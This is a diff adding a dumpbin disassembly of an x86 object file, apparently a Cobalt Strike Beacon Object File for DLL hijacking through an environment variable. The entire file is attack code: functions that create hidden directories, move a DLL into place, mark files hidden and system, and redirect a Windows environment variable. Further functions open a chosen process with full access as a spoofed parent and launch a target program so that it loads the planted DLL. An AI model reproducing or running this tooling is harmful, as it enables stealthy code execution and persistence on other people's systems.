@@ -1,0 +1,570 @@
+Microsoft (R) COFF/PE Dumper Version 14.31.31107.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+
+Dump of file dllenvhijacking.x86.o
+
+File Type: COFF OBJECT
+
+_CreateHiddenDir:
+  00000000: 55                 push        ebp
+  00000001: 8B EC              mov         ebp,esp
+  00000003: 51                 push        ecx
+  00000004: 6A 00              push        0
+  00000006: 8B 45 08           mov         eax,dword ptr [ebp+8]
+  00000009: 50                 push        eax
+  0000000A: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$CreateDirectoryW@8]
+  00000010: 85 C0              test        eax,eax
+  00000012: 75 3C              jne         00000050
+  00000014: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetLastError@0]
+  0000001A: 3D B7 00 00 00     cmp         eax,0B7h
+  0000001F: 75 10              jne         00000031
+  00000021: 68 00 00 00 00     push        offset $SG100397
+  00000026: 6A 0D              push        0Dh
+  00000028: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  0000002E: 83 C4 08           add         esp,8
+  00000031: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetLastError@0]
+  00000037: 83 F8 03           cmp         eax,3
+  0000003A: 75 10              jne         0000004C
+  0000003C: 68 00 00 00 00     push        offset $SG100399
+  00000041: 6A 0D              push        0Dh
+  00000043: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  00000049: 83 C4 08           add         esp,8
+  0000004C: 33 C0              xor         eax,eax
+  0000004E: EB 72              jmp         000000C2
+  00000050: 8B 4D 08           mov         ecx,dword ptr [ebp+8]
+  00000053: 51                 push        ecx
+  00000054: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetFileAttributesW@4]
+  0000005A: 89 45 FC           mov         dword ptr [ebp-4],eax
+  0000005D: 83 7D FC FF        cmp         dword ptr [ebp-4],0FFFFFFFFh
+  00000061: 75 1B              jne         0000007E
+  00000063: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetLastError@0]
+  00000069: 50                 push        eax
+  0000006A: 68 00 00 00 00     push        offset $SG100401
+  0000006F: 6A 0D              push        0Dh
+  00000071: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  00000077: 83 C4 0C           add         esp,0Ch
+  0000007A: 33 C0              xor         eax,eax
+  0000007C: EB 44              jmp         000000C2
+  0000007E: 8B 55 FC           mov         edx,dword ptr [ebp-4]
+  00000081: 83 CA 02           or          edx,2
+  00000084: 89 55 FC           mov         dword ptr [ebp-4],edx
+  00000087: 8B 45 FC           mov         eax,dword ptr [ebp-4]
+  0000008A: 83 C8 04           or          eax,4
+  0000008D: 89 45 FC           mov         dword ptr [ebp-4],eax
+  00000090: 8B 4D FC           mov         ecx,dword ptr [ebp-4]
+  00000093: 51                 push        ecx
+  00000094: 8B 55 08           mov         edx,dword ptr [ebp+8]
+  00000097: 52                 push        edx
+  00000098: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$SetFileAttributesW@8]
+  0000009E: 85 C0              test        eax,eax
+  000000A0: 75 1B              jne         000000BD
+  000000A2: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetLastError@0]
+  000000A8: 50                 push        eax
+  000000A9: 68 00 00 00 00     push        offset $SG100403
+  000000AE: 6A 0D              push        0Dh
+  000000B0: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  000000B6: 83 C4 0C           add         esp,0Ch
+  000000B9: 33 C0              xor         eax,eax
+  000000BB: EB 05              jmp         000000C2
+  000000BD: B8 01 00 00 00     mov         eax,1
+  000000C2: 8B E5              mov         esp,ebp
+  000000C4: 5D                 pop         ebp
+  000000C5: C3                 ret
+  000000C6: CC                 int         3
+  000000C7: CC                 int         3
+  000000C8: CC                 int         3
+  000000C9: CC                 int         3
+  000000CA: CC                 int         3
+  000000CB: CC                 int         3
+  000000CC: CC                 int         3
+  000000CD: CC                 int         3
+  000000CE: CC                 int         3
+  000000CF: CC                 int         3
+_CreateHiddenFile:
+  000000D0: 55                 push        ebp
+  000000D1: 8B EC              mov         ebp,esp
+  000000D3: 83 EC 3C           sub         esp,3Ch
+  000000D6: 68 00 00 00 00     push        offset $SG100423
+  000000DB: 68 00 00 00 00     push        offset $SG100424
+  000000E0: FF 15 00 00 00 00  call        dword ptr [__imp__GetModuleHandleA@4]
+  000000E6: 50                 push        eax
+  000000E7: FF 15 00 00 00 00  call        dword ptr [__imp__GetProcAddress@8]
+  000000ED: 89 45 F8           mov         dword ptr [ebp-8],eax
+  000000F0: 83 7D F8 00        cmp         dword ptr [ebp-8],0
+  000000F4: 75 07              jne         000000FD
+  000000F6: 33 C0              xor         eax,eax
+  000000F8: E9 00 01 00 00     jmp         000001FD
+  000000FD: 68 00 00 00 00     push        offset $SG100426
+  00000102: 68 00 00 00 00     push        offset $SG100427
+  00000107: FF 15 00 00 00 00  call        dword ptr [__imp__GetModuleHandleA@4]
+  0000010D: 50                 push        eax
+  0000010E: FF 15 00 00 00 00  call        dword ptr [__imp__GetProcAddress@8]
+  00000114: 89 45 F4           mov         dword ptr [ebp-0Ch],eax
+  00000117: 83 7D F4 00        cmp         dword ptr [ebp-0Ch],0
+  0000011B: 75 07              jne         00000124
+  0000011D: 33 C0              xor         eax,eax
+  0000011F: E9 D9 00 00 00     jmp         000001FD
+  00000124: 6A 00              push        0
+  00000126: 6A 00              push        0
+  00000128: 6A 03              push        3
+  0000012A: 6A 00              push        0
+  0000012C: 6A 00              push        0
+  0000012E: 68 00 01 00 C0     push        0C0000100h
+  00000133: 8B 45 08           mov         eax,dword ptr [ebp+8]
+  00000136: 50                 push        eax
+  00000137: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$CreateFileW@28]
+  0000013D: 89 45 FC           mov         dword ptr [ebp-4],eax
+  00000140: 83 7D FC FF        cmp         dword ptr [ebp-4],0FFFFFFFFh
+  00000144: 75 1E              jne         00000164
+  00000146: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetLastError@0]
+  0000014C: 50                 push        eax
+  0000014D: 68 00 00 00 00     push        offset $SG100430
+  00000152: 6A 0D              push        0Dh
+  00000154: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  0000015A: 83 C4 0C           add         esp,0Ch
+  0000015D: 33 C0              xor         eax,eax
+  0000015F: E9 99 00 00 00     jmp         000001FD
+  00000164: 6A 04              push        4
+  00000166: 6A 28              push        28h
+  00000168: 8D 4D C4           lea         ecx,[ebp-3Ch]
+  0000016B: 51                 push        ecx
+  0000016C: 8D 55 EC           lea         edx,[ebp-14h]
+  0000016F: 52                 push        edx
+  00000170: 8B 45 FC           mov         eax,dword ptr [ebp-4]
+  00000173: 50                 push        eax
+  00000174: FF 55 F8           call        dword ptr [ebp-8]
+  00000177: 85 C0              test        eax,eax
+  00000179: 7D 25              jge         000001A0
+  0000017B: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetLastError@0]
+  00000181: 50                 push        eax
+  00000182: 68 00 00 00 00     push        offset $SG100432
+  00000187: 6A 0D              push        0Dh
+  00000189: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  0000018F: 83 C4 0C           add         esp,0Ch
+  00000192: 8B 4D FC           mov         ecx,dword ptr [ebp-4]
+  00000195: 51                 push        ecx
+  00000196: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$CloseHandle@4]
+  0000019C: 33 C0              xor         eax,eax
+  0000019E: EB 5D              jmp         000001FD
+  000001A0: 8B 55 E4           mov         edx,dword ptr [ebp-1Ch]
+  000001A3: 83 CA 02           or          edx,2
+  000001A6: 89 55 E4           mov         dword ptr [ebp-1Ch],edx
+  000001A9: 8B 45 E4           mov         eax,dword ptr [ebp-1Ch]
+  000001AC: 83 C8 04           or          eax,4
+  000001AF: 89 45 E4           mov         dword ptr [ebp-1Ch],eax
+  000001B2: 6A 04              push        4
+  000001B4: 6A 28              push        28h
+  000001B6: 8D 4D C4           lea         ecx,[ebp-3Ch]
+  000001B9: 51                 push        ecx
+  000001BA: 8D 55 EC           lea         edx,[ebp-14h]
+  000001BD: 52                 push        edx
+  000001BE: 8B 45 FC           mov         eax,dword ptr [ebp-4]
+  000001C1: 50                 push        eax
+  000001C2: FF 55 F4           call        dword ptr [ebp-0Ch]
+  000001C5: 85 C0              test        eax,eax
+  000001C7: 7D 25              jge         000001EE
+  000001C9: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetLastError@0]
+  000001CF: 50                 push        eax
+  000001D0: 68 00 00 00 00     push        offset $SG100434
+  000001D5: 6A 0D              push        0Dh
+  000001D7: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  000001DD: 83 C4 0C           add         esp,0Ch
+  000001E0: 8B 4D FC           mov         ecx,dword ptr [ebp-4]
+  000001E3: 51                 push        ecx
+  000001E4: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$CloseHandle@4]
+  000001EA: 33 C0              xor         eax,eax
+  000001EC: EB 0F              jmp         000001FD
+  000001EE: 8B 55 FC           mov         edx,dword ptr [ebp-4]
+  000001F1: 52                 push        edx
+  000001F2: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$CloseHandle@4]
+  000001F8: B8 01 00 00 00     mov         eax,1
+  000001FD: 8B E5              mov         esp,ebp
+  000001FF: 5D                 pop         ebp
+  00000200: C3                 ret
+  00000201: CC                 int         3
+  00000202: CC                 int         3
+  00000203: CC                 int         3
+  00000204: CC                 int         3
+  00000205: CC                 int         3
+  00000206: CC                 int         3
+  00000207: CC                 int         3
+  00000208: CC                 int         3
+  00000209: CC                 int         3
+  0000020A: CC                 int         3
+  0000020B: CC                 int         3
+  0000020C: CC                 int         3
+  0000020D: CC                 int         3
+  0000020E: CC                 int         3
+  0000020F: CC                 int         3
+_MoveDLL:
+  00000210: 55                 push        ebp
+  00000211: 8B EC              mov         ebp,esp
+  00000213: 8B 45 0C           mov         eax,dword ptr [ebp+0Ch]
+  00000216: 50                 push        eax
+  00000217: 8B 4D 08           mov         ecx,dword ptr [ebp+8]
+  0000021A: 51                 push        ecx
+  0000021B: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$MoveFileW@8]
+  00000221: 85 C0              test        eax,eax
+  00000223: 75 1F              jne         00000244
+  00000225: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetLastError@0]
+  0000022B: 50                 push        eax
+  0000022C: 8B 55 08           mov         edx,dword ptr [ebp+8]
+  0000022F: 52                 push        edx
+  00000230: 68 00 00 00 00     push        offset $SG100442
+  00000235: 6A 0D              push        0Dh
+  00000237: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  0000023D: 83 C4 10           add         esp,10h
+  00000240: 33 C0              xor         eax,eax
+  00000242: EB 05              jmp         00000249
+  00000244: B8 01 00 00 00     mov         eax,1
+  00000249: 5D                 pop         ebp
+  0000024A: C3                 ret
+  0000024B: CC                 int         3
+  0000024C: CC                 int         3
+  0000024D: CC                 int         3
+  0000024E: CC                 int         3
+  0000024F: CC                 int         3
+_RunProc:
+  00000250: 55                 push        ebp
+  00000251: 8B EC              mov         ebp,esp
+  00000253: 83 EC 68           sub         esp,68h
+  00000256: C7 45 98 48 00 00  mov         dword ptr [ebp-68h],48h
+            00
+  0000025D: 6A 44              push        44h
+  0000025F: 6A 00              push        0
+  00000261: 8D 45 9C           lea         eax,[ebp-64h]
+  00000264: 50                 push        eax
+  00000265: E8 00 00 00 00     call        _memset
+  0000026A: 83 C4 0C           add         esp,0Ch
+  0000026D: C7 45 F8 00 00 00  mov         dword ptr [ebp-8],0
+            00
+  00000274: C7 45 FC 00 00 00  mov         dword ptr [ebp-4],0
+            00
+  0000027B: C7 45 F4 00 00 00  mov         dword ptr [ebp-0Ch],0
+            00
+  00000282: C7 45 F0 01 00 00  mov         dword ptr [ebp-10h],1
+            00
+  00000289: 8B 4D 08           mov         ecx,dword ptr [ebp+8]
+  0000028C: 51                 push        ecx
+  0000028D: 68 00 00 00 00     push        offset $SG100470
+  00000292: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$SetEnvironmentVariableW@8]
+  00000298: 85 C0              test        eax,eax
+  0000029A: 75 17              jne         000002B3
+  0000029C: 68 00 00 00 00     push        offset $SG100471
+  000002A1: 6A 0D              push        0Dh
+  000002A3: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  000002A9: 83 C4 08           add         esp,8
+  000002AC: 33 C0              xor         eax,eax
+  000002AE: E9 EA 00 00 00     jmp         0000039D
+  000002B3: 8D 55 F8           lea         edx,[ebp-8]
+  000002B6: 52                 push        edx
+  000002B7: 6A 00              push        0
+  000002B9: 6A 01              push        1
+  000002BB: 6A 00              push        0
+  000002BD: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$InitializeProcThreadAttributeList@16]
+  000002C3: 8B 45 F8           mov         eax,dword ptr [ebp-8]
+  000002C6: 50                 push        eax
+  000002C7: 6A 00              push        0
+  000002C9: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$GetProcessHeap@0]
+  000002CF: 50                 push        eax
+  000002D0: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$HeapAlloc@12]
+  000002D6: 89 45 FC           mov         dword ptr [ebp-4],eax
+  000002D9: 8D 4D F8           lea         ecx,[ebp-8]
+  000002DC: 51                 push        ecx
+  000002DD: 6A 00              push        0
+  000002DF: 6A 01              push        1
+  000002E1: 8B 55 FC           mov         edx,dword ptr [ebp-4]
+  000002E4: 52                 push        edx
+  000002E5: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$InitializeProcThreadAttributeList@16]
+  000002EB: 8B 45 10           mov         eax,dword ptr [ebp+10h]
+  000002EE: 50                 push        eax
+  000002EF: 6A 00              push        0
+  000002F1: 68 FF FF 1F 00     push        1FFFFFh
+  000002F6: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$OpenProcess@12]
+  000002FC: 89 45 F4           mov         dword ptr [ebp-0Ch],eax
+  000002FF: 6A 00              push        0
+  00000301: 6A 00              push        0
+  00000303: 6A 04              push        4
+  00000305: 8D 4D F4           lea         ecx,[ebp-0Ch]
+  00000308: 51                 push        ecx
+  00000309: 68 00 00 02 00     push        20000h
+  0000030E: 6A 00              push        0
+  00000310: 8B 55 FC           mov         edx,dword ptr [ebp-4]
+  00000313: 52                 push        edx
+  00000314: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$UpdateProcThreadAttribute@28]
+  0000031A: 8B 45 FC           mov         eax,dword ptr [ebp-4]
+  0000031D: 89 45 DC           mov         dword ptr [ebp-24h],eax
+  00000320: 8D 4D E0           lea         ecx,[ebp-20h]
+  00000323: 51                 push        ecx
+  00000324: 8D 55 98           lea         edx,[ebp-68h]
+  00000327: 52                 push        edx
+  00000328: 6A 00              push        0
+  0000032A: 6A 00              push        0
+  0000032C: 68 10 00 08 00     push        80010h
+  00000331: 6A 00              push        0
+  00000333: 6A 00              push        0
+  00000335: 6A 00              push        0
+  00000337: 8B 45 0C           mov         eax,dword ptr [ebp+0Ch]
+  0000033A: 50                 push        eax
+  0000033B: 6A 00              push        0
+  0000033D: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$CreateProcessA@40]
+  00000343: 85 C0              test        eax,eax
+  00000345: 75 07              jne         0000034E
+  00000347: C7 45 F0 00 00 00  mov         dword ptr [ebp-10h],0
+            00
+  0000034E: 68 00 00 00 00     push        offset $SG100474
+  00000353: 68 00 00 00 00     push        offset $SG100475
+  00000358: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$SetEnvironmentVariableW@8]
+  0000035E: 85 C0              test        eax,eax
+  00000360: 75 10              jne         00000372
+  00000362: 68 00 00 00 00     push        offset $SG100476
+  00000367: 6A 0D              push        0Dh
+  00000369: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  0000036F: 83 C4 08           add         esp,8
+  00000372: 8B 4D FC           mov         ecx,dword ptr [ebp-4]
+  00000375: 51                 push        ecx
+  00000376: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$DeleteProcThreadAttributeList@4]
+  0000037C: 8B 55 F4           mov         edx,dword ptr [ebp-0Ch]
+  0000037F: 52                 push        edx
+  00000380: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$CloseHandle@4]
+  00000386: 8B 45 E0           mov         eax,dword ptr [ebp-20h]
+  00000389: 50                 push        eax
+  0000038A: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$CloseHandle@4]
+  00000390: 8B 4D E4           mov         ecx,dword ptr [ebp-1Ch]
+  00000393: 51                 push        ecx
+  00000394: FF 15 00 00 00 00  call        dword ptr [__imp__KERNEL32$CloseHandle@4]
+  0000039A: 8B 45 F0           mov         eax,dword ptr [ebp-10h]
+  0000039D: 8B E5              mov         esp,ebp
+  0000039F: 5D                 pop         ebp
+  000003A0: C3                 ret
+  000003A1: CC                 int         3
+  000003A2: CC                 int         3
+  000003A3: CC                 int         3
+  000003A4: CC                 int         3
+  000003A5: CC                 int         3
+  000003A6: CC                 int         3
+  000003A7: CC                 int         3
+  000003A8: CC                 int         3
+  000003A9: CC                 int         3
+  000003AA: CC                 int         3
+  000003AB: CC                 int         3
+  000003AC: CC                 int         3
+  000003AD: CC                 int         3
+  000003AE: CC                 int         3
+  000003AF: CC                 int         3
+_go:
+  000003B0: 55                 push        ebp
+  000003B1: 8B EC              mov         ebp,esp
+  000003B3: 81 EC 10 03 00 00  sub         esp,310h
+  000003B9: A1 00 00 00 00     mov         eax,dword ptr [$SG100500]
+  000003BE: 89 45 AC           mov         dword ptr [ebp-54h],eax
+  000003C1: 8B 0D 04 00 00 00  mov         ecx,dword ptr [$SG100500+4]
+  000003C7: 89 4D B0           mov         dword ptr [ebp-50h],ecx
+  000003CA: 8B 15 08 00 00 00  mov         edx,dword ptr [$SG100500+8]
+  000003D0: 89 55 B4           mov         dword ptr [ebp-4Ch],edx
+  000003D3: A1 0C 00 00 00     mov         eax,dword ptr [$SG100500+0Ch]
+  000003D8: 89 45 B8           mov         dword ptr [ebp-48h],eax
+  000003DB: 8B 0D 10 00 00 00  mov         ecx,dword ptr [$SG100500+10h]
+  000003E1: 89 4D BC           mov         dword ptr [ebp-44h],ecx
+  000003E4: 8B 15 00 00 00 00  mov         edx,dword ptr [$SG100501]
+  000003EA: 89 55 C0           mov         dword ptr [ebp-40h],edx
+  000003ED: A1 04 00 00 00     mov         eax,dword ptr [$SG100501+4]
+  000003F2: 89 45 C4           mov         dword ptr [ebp-3Ch],eax
+  000003F5: 8B 0D 08 00 00 00  mov         ecx,dword ptr [$SG100501+8]
+  000003FB: 89 4D C8           mov         dword ptr [ebp-38h],ecx
+  000003FE: 8B 15 0C 00 00 00  mov         edx,dword ptr [$SG100501+0Ch]
+  00000404: 89 55 CC           mov         dword ptr [ebp-34h],edx
+  00000407: A1 10 00 00 00     mov         eax,dword ptr [$SG100501+10h]
+  0000040C: 89 45 D0           mov         dword ptr [ebp-30h],eax
+  0000040F: 8A 0D 14 00 00 00  mov         cl,byte ptr [$SG100501+14h]
+  00000415: 88 4D D4           mov         byte ptr [ebp-2Ch],cl
+  00000418: C7 45 FC 00 00 00  mov         dword ptr [ebp-4],0
+            00
+  0000041F: 8B 55 0C           mov         edx,dword ptr [ebp+0Ch]
+  00000422: 52                 push        edx
+  00000423: 8B 45 08           mov         eax,dword ptr [ebp+8]
+  00000426: 50                 push        eax
+  00000427: 8D 4D D8           lea         ecx,[ebp-28h]
+  0000042A: 51                 push        ecx
+  0000042B: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconDataParse]
+  00000431: 83 C4 0C           add         esp,0Ch
+  00000434: 6A 00              push        0
+  00000436: 8D 55 D8           lea         edx,[ebp-28h]
+  00000439: 52                 push        edx
+  0000043A: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconDataExtract]
+  00000440: 83 C4 08           add         esp,8
+  00000443: 89 45 F8           mov         dword ptr [ebp-8],eax
+  00000446: 6A 00              push        0
+  00000448: 8D 45 D8           lea         eax,[ebp-28h]
+  0000044B: 50                 push        eax
+  0000044C: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconDataExtract]
+  00000452: 83 C4 08           add         esp,8
+  00000455: 89 45 F0           mov         dword ptr [ebp-10h],eax
+  00000458: 6A 00              push        0
+  0000045A: 8D 4D D8           lea         ecx,[ebp-28h]
+  0000045D: 51                 push        ecx
+  0000045E: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconDataExtract]
+  00000464: 83 C4 08           add         esp,8
+  00000467: 89 45 EC           mov         dword ptr [ebp-14h],eax
+  0000046A: 6A 00              push        0
+  0000046C: 8D 55 D8           lea         edx,[ebp-28h]
+  0000046F: 52                 push        edx
+  00000470: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconDataExtract]
+  00000476: 83 C4 08           add         esp,8
+  00000479: 89 45 E8           mov         dword ptr [ebp-18h],eax
+  0000047C: 8D 45 D8           lea         eax,[ebp-28h]
+  0000047F: 50                 push        eax
+  00000480: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconDataInt]
+  00000486: 83 C4 04           add         esp,4
+  00000489: 89 45 F4           mov         dword ptr [ebp-0Ch],eax
+  0000048C: 8B 4D F8           mov         ecx,dword ptr [ebp-8]
+  0000048F: 51                 push        ecx
+  00000490: E8 00 00 00 00     call        _CreateHiddenDir
+  00000495: 83 C4 04           add         esp,4
+  00000498: 89 45 FC           mov         dword ptr [ebp-4],eax
+  0000049B: 83 7D FC 00        cmp         dword ptr [ebp-4],0
+  0000049F: 75 09              jne         000004AA
+  000004A1: 33 C0              xor         eax,eax
+  000004A3: E9 B0 01 00 00     jmp         00000658
+  000004A8: EB 07              jmp         000004B1
+  000004AA: C7 45 FC 00 00 00  mov         dword ptr [ebp-4],0
+            00
+  000004B1: 8B 55 F8           mov         edx,dword ptr [ebp-8]
+  000004B4: 52                 push        edx
+  000004B5: 8D 85 80 FE FF FF  lea         eax,[ebp-180h]
+  000004BB: 50                 push        eax
+  000004BC: FF 15 00 00 00 00  call        dword ptr [__imp__MSVCRT$wcscpy]
+  000004C2: 83 C4 08           add         esp,8
+  000004C5: 8D 4D AC           lea         ecx,[ebp-54h]
+  000004C8: 51                 push        ecx
+  000004C9: 8D 95 80 FE FF FF  lea         edx,[ebp-180h]
+  000004CF: 52                 push        edx
+  000004D0: FF 15 00 00 00 00  call        dword ptr [__imp__MSVCRT$wcscat]
+  000004D6: 83 C4 08           add         esp,8
+  000004D9: 8D 85 80 FE FF FF  lea         eax,[ebp-180h]
+  000004DF: 50                 push        eax
+  000004E0: E8 00 00 00 00     call        _CreateHiddenDir
+  000004E5: 83 C4 04           add         esp,4
+  000004E8: 89 45 FC           mov         dword ptr [ebp-4],eax
+  000004EB: 83 7D FC 00        cmp         dword ptr [ebp-4],0
+  000004EF: 75 09              jne         000004FA
+  000004F1: 33 C0              xor         eax,eax
+  000004F3: E9 60 01 00 00     jmp         00000658
+  000004F8: EB 1E              jmp         00000518
+  000004FA: 8D 8D 80 FE FF FF  lea         ecx,[ebp-180h]
+  00000500: 51                 push        ecx
+  00000501: 68 00 00 00 00     push        offset $SG100506
+  00000506: 6A 00              push        0
+  00000508: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  0000050E: 83 C4 0C           add         esp,0Ch
+  00000511: C7 45 FC 00 00 00  mov         dword ptr [ebp-4],0
+            00
+  00000518: 8D 95 80 FE FF FF  lea         edx,[ebp-180h]
+  0000051E: 52                 push        edx
+  0000051F: 8D 85 B8 FD FF FF  lea         eax,[ebp-248h]
+  00000525: 50                 push        eax
+  00000526: FF 15 00 00 00 00  call        dword ptr [__imp__MSVCRT$wcscpy]
+  0000052C: 83 C4 08           add         esp,8
+  0000052F: 8B 4D F0           mov         ecx,dword ptr [ebp-10h]
+  00000532: 51                 push        ecx
+  00000533: 8D 95 B8 FD FF FF  lea         edx,[ebp-248h]
+  00000539: 52                 push        edx
+  0000053A: FF 15 00 00 00 00  call        dword ptr [__imp__MSVCRT$wcscat]
+  00000540: 83 C4 08           add         esp,8
+  00000543: 8B 45 EC           mov         eax,dword ptr [ebp-14h]
+  00000546: 50                 push        eax
+  00000547: 8D 8D F0 FC FF FF  lea         ecx,[ebp-310h]
+  0000054D: 51                 push        ecx
+  0000054E: FF 15 00 00 00 00  call        dword ptr [__imp__MSVCRT$wcscpy]
+  00000554: 83 C4 08           add         esp,8
+  00000557: 8B 55 F0           mov         edx,dword ptr [ebp-10h]
+  0000055A: 52                 push        edx
+  0000055B: 8D 85 F0 FC FF FF  lea         eax,[ebp-310h]
+  00000561: 50                 push        eax
+  00000562: FF 15 00 00 00 00  call        dword ptr [__imp__MSVCRT$wcscat]
+  00000568: 83 C4 08           add         esp,8
+  0000056B: 8D 8D B8 FD FF FF  lea         ecx,[ebp-248h]
+  00000571: 51                 push        ecx
+  00000572: 8D 95 F0 FC FF FF  lea         edx,[ebp-310h]
+  00000578: 52                 push        edx
+  00000579: E8 00 00 00 00     call        _MoveDLL
+  0000057E: 83 C4 08           add         esp,8
+  00000581: 89 45 FC           mov         dword ptr [ebp-4],eax
+  00000584: 83 7D FC 00        cmp         dword ptr [ebp-4],0
+  00000588: 75 09              jne         00000593
+  0000058A: 33 C0              xor         eax,eax
+  0000058C: E9 C7 00 00 00     jmp         00000658
+  00000591: EB 07              jmp         0000059A
+  00000593: C7 45 FC 00 00 00  mov         dword ptr [ebp-4],0
+            00
+  0000059A: 8D 85 B8 FD FF FF  lea         eax,[ebp-248h]
+  000005A0: 50                 push        eax
+  000005A1: E8 00 00 00 00     call        _CreateHiddenFile
+  000005A6: 83 C4 04           add         esp,4
+  000005A9: 89 45 FC           mov         dword ptr [ebp-4],eax
+  000005AC: 83 7D FC 00        cmp         dword ptr [ebp-4],0
+  000005B0: 75 09              jne         000005BB
+  000005B2: 33 C0              xor         eax,eax
+  000005B4: E9 9F 00 00 00     jmp         00000658
+  000005B9: EB 1E              jmp         000005D9
+  000005BB: 8D 8D B8 FD FF FF  lea         ecx,[ebp-248h]
+  000005C1: 51                 push        ecx
+  000005C2: 68 00 00 00 00     push        offset $SG100511
+  000005C7: 6A 00              push        0
+  000005C9: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  000005CF: 83 C4 0C           add         esp,0Ch
+  000005D2: C7 45 FC 00 00 00  mov         dword ptr [ebp-4],0
+            00
+  000005D9: 8D 55 C0           lea         edx,[ebp-40h]
+  000005DC: 52                 push        edx
+  000005DD: 8D 85 48 FF FF FF  lea         eax,[ebp-0B8h]
+  000005E3: 50                 push        eax
+  000005E4: FF 15 00 00 00 00  call        dword ptr [__imp__MSVCRT$strcpy]
+  000005EA: 83 C4 08           add         esp,8
+  000005ED: 8B 4D E8           mov         ecx,dword ptr [ebp-18h]
+  000005F0: 51                 push        ecx
+  000005F1: 8D 95 48 FF FF FF  lea         edx,[ebp-0B8h]
+  000005F7: 52                 push        edx
+  000005F8: FF 15 00 00 00 00  call        dword ptr [__imp__MSVCRT$strcat]
+  000005FE: 83 C4 08           add         esp,8
+  00000601: 8B 45 F4           mov         eax,dword ptr [ebp-0Ch]
+  00000604: 50                 push        eax
+  00000605: 8D 8D 48 FF FF FF  lea         ecx,[ebp-0B8h]
+  0000060B: 51                 push        ecx
+  0000060C: 8B 55 F8           mov         edx,dword ptr [ebp-8]
+  0000060F: 52                 push        edx
+  00000610: E8 00 00 00 00     call        _RunProc
+  00000615: 83 C4 0C           add         esp,0Ch
+  00000618: 89 45 FC           mov         dword ptr [ebp-4],eax
+  0000061B: 83 7D FC 00        cmp         dword ptr [ebp-4],0
+  0000061F: 75 1D              jne         0000063E
+  00000621: 8B 45 F4           mov         eax,dword ptr [ebp-0Ch]
+  00000624: 50                 push        eax
+  00000625: 8D 8D 48 FF FF FF  lea         ecx,[ebp-0B8h]
+  0000062B: 51                 push        ecx
+  0000062C: 68 00 00 00 00     push        offset $SG100514
+  00000631: 6A 0D              push        0Dh
+  00000633: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  00000639: 83 C4 10           add         esp,10h
+  0000063C: EB 18              jmp         00000656
+  0000063E: 8B 55 F4           mov         edx,dword ptr [ebp-0Ch]
+  00000641: 52                 push        edx
+  00000642: 8B 45 F8           mov         eax,dword ptr [ebp-8]
+  00000645: 50                 push        eax
+  00000646: 68 00 00 00 00     push        offset $SG100515
+  0000064B: 6A 00              push        0
+  0000064D: FF 15 00 00 00 00  call        dword ptr [__imp__BeaconPrintf]
+  00000653: 83 C4 10           add         esp,10h
+  00000656: 33 C0              xor         eax,eax
+  00000658: 8B E5              mov         esp,ebp
+  0000065A: 5D                 pop         ebp
+  0000065B: C3                 ret
+
+  Summary
+
+          28 .chks64
+         442 .data
+          C8 .debug$S
+          5D .drectve
+         65C .text$mn
